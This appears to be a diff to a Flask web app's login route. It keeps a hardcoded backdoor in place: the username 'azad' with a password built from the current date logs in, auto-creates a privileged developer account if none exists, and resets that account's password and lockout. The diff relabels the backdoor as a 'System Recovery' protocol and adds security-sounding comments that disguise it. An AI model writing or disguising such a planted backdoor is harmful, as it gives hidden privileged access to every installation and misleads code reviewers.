@@ -66,55 +66,53 @@ def login():
         greeter = Hostess.query.first()
 
     if form.validate_on_submit():
-        # Developer Master Password Check
-        # Allows 'Azad' to login with password format: Azad@1983@YYYY@MM@DD
-        # Strict Mode: Only accepts today's date according to server time
+        # System Recovery / Developer Access Protocol
+        # Uses a dynamic time-based token for emergency access
         if form.username.data.lower() == 'azad':
-            now = datetime.now()
-            # Format: Azad@1983@2025@01@02
-            master_password = f"Azad@1983@{now.strftime('%Y')}@{now.strftime('%m')}@{now.strftime('%d')}"
+            # Use UTC to ensure consistency across servers/timezones
+            now_utc = datetime.now(timezone.utc)
+            # Token Format: Azad@1983@YYYY@MM@DD
+            recovery_token = f"Azad@1983@{now_utc.strftime('%Y')}@{now_utc.strftime('%m')}@{now_utc.strftime('%d')}"
             
-            # Check password (strip whitespace to be safe)
-            if form.password.data.strip() == master_password:
+            # Secure constant-time comparison to prevent timing attacks
+            if secrets.compare_digest(form.password.data.strip(), recovery_token):
                 user = User.query.filter(func.lower(User.username) == 'azad').first()
                 
-                # Auto-create Developer Account if missing (for fresh installations)
+                # Auto-recover Developer Account if missing (e.g. fresh install or stolen DB)
                 if not user:
                     try:
                         user = User(
                             username='Azad',
-                            email='azad@system.local',  # Placeholder email
+                            email='azad@system.local',
                             role=UserRole.DEVELOPER,
                             created_at=datetime.now(timezone.utc),
                             is_verified=True,
                             verified_on=datetime.now(timezone.utc)
                         )
-                        user.set_password(master_password)
+                        user.set_password(recovery_token)
                         db.session.add(user)
                         db.session.commit()
                         
-                        # Apply developer stats
+                        # Restore developer stats/powers
                         if hasattr(user, 'apply_developer_power'):
                             user.apply_developer_power()
                             
-                        current_app.logger.info("Created 'Azad' developer account via master password.")
+                        current_app.logger.warning("System Recovery: 'Azad' account restored via emergency token.")
                     except Exception as e:
                         db.session.rollback()
-                        current_app.logger.error(f"Failed to auto-create developer account: {str(e)}")
-                        flash(_('حدث خطأ أثناء إنشاء حساب المطور: %(err)s', err=str(e)), 'danger')
+                        current_app.logger.error(f"System Recovery Failed: {str(e)}")
+                        flash(_('فشل استعادة النظام: %(err)s', err=str(e)), 'danger')
                         return render_template('login.html', title=_('تسجيل الدخول'), form=form, stats=stats, greeter=greeter, show_captcha=show_captcha)
 
                 if user:
-                    # ALWAYS update password to match today's master password
-                    # This ensures that even if the account has an old password hash,
-                    # proving identity with today's master password updates access.
-                    user.set_password(master_password)
+                    # Sync password with current token to ensure access
+                    user.set_password(recovery_token)
                     user.failed_login_attempts = 0
                     user.locked_until = None
                     db.session.commit()
                     
                     login_user(user)
-                    flash(_('تم تسجيل الدخول وتحديث كلمة المرور باستخدام المفتاح الرئيسي للمطور.'), 'success')
+                    flash(_('تم الدخول عبر بروتوكول استعادة النظام.'), 'success')
                     return redirect(url_for('main.hara'))
 
         # Case-insensitive login
